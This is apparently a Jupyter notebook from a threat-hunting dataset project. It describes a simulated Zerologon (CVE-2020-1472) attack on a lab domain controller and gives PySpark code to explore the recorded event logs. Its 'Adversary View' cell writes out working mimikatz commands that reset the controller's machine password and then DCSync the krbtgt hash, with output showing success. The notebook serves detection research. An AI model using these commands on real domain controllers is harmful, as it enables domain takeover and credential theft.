{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f8fd2757",
   "metadata": {},
   "source": [
    "# Mimikatz Netlogon Unauthenticated NetrServerAuthenticate2"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc97f06b",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "23513ea5",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/09/16 |\n",
    "| Modification Date | 2020/09/16 |\n",
    "| Tactics           | ['[TA0008](https://attack.mitre.org/tactics/TA0008)'] |\n",
    "| Techniques        | ['[T1210](https://attack.mitre.org/techniques/T1210)'] |\n",
    "| Tags              | ['CVE-2020-1472', 'Password Update', 'Netlogon Insecure AES-CFB8'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2fc7fde0",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries leveraging a vulnerability (CVE-2020-1472) in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This vulnerability was discovered by [@@SecuraBV](https://twitter.com/SecuraBV)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "50aef77a",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e7574a8a",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "548c9161",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d6804dd8",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3629718a",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "26da64c6",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [ShellCmd](https://github.com/cobbr/Covenant/blob/7555b19ffb9401c0e37094c25e404a640b1688d7/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96) |\n",
    "| Mordor shire | tool | [lsadump](https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L23) |\n",
    "| Mordor shire | tool | [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e1a48725",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Mimikatz Implementation (NetrServerAuthenticate2)\n",
    "=================================================\n",
    "\n",
    "(wardog) > ShellCmd /shellcommand:\"C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \\\"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\\\" exit\"\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 16 2020 12:02:22\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "\n",
    "mimikatz(commandline) # lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\n",
    "\n",
    "Target : MORDORDC.theshire.local\n",
    "Account: MORDORDC$\n",
    "Type   : 6 (Server)\n",
    "Mode   : exploit\n",
    "\n",
    "Trying to 'authenticate'...\n",
    "====================================================\n",
    "\n",
    "NetrServerAuthenticate2: 0x00000000\n",
    "NetrServerPasswordSet2 : 0x00000000\n",
    "\n",
    "* Authentication: OK -- vulnerable\n",
    "* Set password  : OK -- may be unstable\n",
    "\n",
    "mimikatz(commandline) # exit\n",
    "\n",
    "Bye!\n",
    "\n",
    "DCSync Follow-up (Optional)\n",
    "(wardog) > ShellCmd /shellcommand:\"C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \\\"lsadump::dcsync /domain:theshire.local /dc:MORDORDC.theshire.local /user:krbtgt /authuser:MORDORDC$ /authdomain:theshire /authpassword:\\\\\"\\\\\" /authntlm\\\" exit\"\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d736479",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4113143c",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "edf6a296",
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fad0efdb",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c3df964d",
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab7c3c95",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "be0cff98",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
